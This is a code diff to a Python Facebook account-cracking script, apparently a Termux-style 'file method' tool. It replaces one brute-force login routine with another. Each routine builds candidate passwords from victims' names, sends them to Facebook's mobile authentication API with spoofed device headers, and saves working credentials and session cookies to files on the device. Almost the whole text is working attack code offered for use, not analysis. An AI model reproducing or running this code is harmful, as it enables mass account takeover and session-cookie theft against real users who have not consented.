@@ -241,75 +241,54 @@ class main_crack():
             time.sleep(2)
             main_crack().crack(id)
 #__________________[ FILE METHOD M1 ]__________________#           
-    def methodA(self, sid, name, psw):
-        try:
-            global oks,cps,loop
-            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
-            sys.stdout.write(f"\r{G1}[{A}SP-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
-            sys.stdout.flush()
-            fs = name.split(' ')[0]
-            try:
-                ls = name.split(' ')[1]
-            except:
-                ls = fs
-            for pw in psw:
-                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
-                with requests.Session() as session:
-                    data = {"adid": str(uuid.uuid4()),
-                    "format": "json",
-                    "device_id": str(uuid.uuid4()),
-                    "cpl": "true",
-                    "family_device_id": str(uuid.uuid4()),
-                    "credentials_type": "device_based_login_password",
-                    "error_detail_type": "button_with_disabled",
-                    "source": "device_based_login",
-                    "email": sid,
-                    "password": ps,
-                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-                    "generate_session_cookies": "1",
-                    "meta_inf_fbmeta": "",
-                    "advertiser_id": str(uuid.uuid4()),
-                    "currently_logged_in_userid": "0",
-                    "locale": "en_GB",
-                    "client_country_code": "GB",
-                    "method": "auth.login",
-                    "fb_api_req_friendly_name": "authenticate",
-                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                    "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {
-                    'User-Agent': mar(),
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Host': 'graph.facebook.com',
-                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-Connection-Type': 'MOBILE.LTE',
-                    'X-Tigon-Is-Retry': 'False',
-                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                    'x-fb-device-group': '5120',
-                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                    'X-FB-Request-Analytics-Tags': 'graphservice',
-                    'X-FB-HTTP-Engine': 'Liger',
-                    'X-FB-Client-IP': 'True',
-                    'X-FB-Server-Cluster': 'True',
-                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-                if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{G1}[SP-OK] {sid} | {ps} ")
-                    print(f"\r\r{G1}[COOKIE]{A} {ckkk}")
-                    open('/sdcard/SP-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
-                    oks.append(sid)
+    def filemeth(uid,names,pwx,tl,qw):
+    global oks,loop,twofec,cpp,koki,lock
+    sys.stdout.write(f'\r  \033[1;37m{spin_ani(loop)} \033[38;5;93m[{savage_animi(loop)}\033[38;5;93m] \033[1;37m[\033[1;30mM\033[1;30m{qw}\033[1;37m] \033[38;5;93m<[\033[1;1m{animation_lop_lt(loop,tl)}\033[1;00m\033[38;5;93m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[38;5;93m]>\033[0;00m\r');sys.stdout.flush()
+    
+    f1=names.split(" ")[0]
+    try:
+        l1=names.split(" ")[1]
+    except:
+        l1=f1
+    
+    try:
+        for pw in pwx:
+                useraget=mas.met2(qw)
+                ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
+                data = {'adid':str(uuid.uuid4()).upper(),'email':uid,'password':ps,'cpl':'true','credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled','source':'login','format':'json','generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',"locale":"en_US","client_country_code":"US",'device':'','device_id':str(uuid.uuid4()).upper(),"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
+                head = {
+                'content-type':'application/x-www-form-urlencoded',
+                'x-fb-sim-hni':str(random.randint(2e4,4e4)),
+                'x-fb-connection-type':'unknown',
+                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'user-agent':useraget,
+                'x-fb-net-hni':str(random.randint(2e4,4e4)),
+                'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+                'x-fb-connection-quality':'EXCELLENT',
+                'x-fb-friendly-name':'authenticate',
+                'accept-encoding':'gzip, deflate',
+                'x-fb-http-engine':'Liger'}
+                url= 'https://api.facebook.com/method/auth.login'
+                rq=httpx.post(url,data=data,headers=head,verify=True).json()
+                if "session_key" in rq:
+                    coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
+                    if "y" in koki:
+                        print(f"\r\r[b]"+savage_co(oks)+f" [bright_green]{uid} [orange3]▶ [bright_green]{ps}               \n{animi(oks)}sb=cracked_by.Savage:tool;"+coki.replace("-1","1")+"\n")
+                    else:
+                        print(f"\r\r  [b dark_red]⁃[chartreuse1]  SUCCESS{anibeket(oks)} [bright_green]{uid} | {ps}          ")
+                    oks.append(uid)
+                    open("/sdcard/SavageOK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
+                    open("/sdcard/SavageID.txt","a").write(uid+"|"+ps+"\n")
+                    live_ck("FILE",qw,uid,ps)
                     break
-                elif 'www.facebook.com' in q['error']['message']:
-                     print(f"\r\r{M}[SP-CP] {sid} | {ps} ")
-                     open('/sdcard/SP-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
-                     cps.append(sid)
-                     break
                 else:
                     continue
-            loop+=1
-        except requests.exceptions.ConnectionError:
-            self.methodA(sid, name, ps)
+        loop+=1
+    except httpx.ConnectError:
+        time.sleep(20)
+        filemeth(uid,names,pwx,tl,qw)
+    except Exception as e:
+        pass
 #__________________[ FILE METHOD M2 ]__________________#             
     def methodB(self, sid, name, psw):
         try:
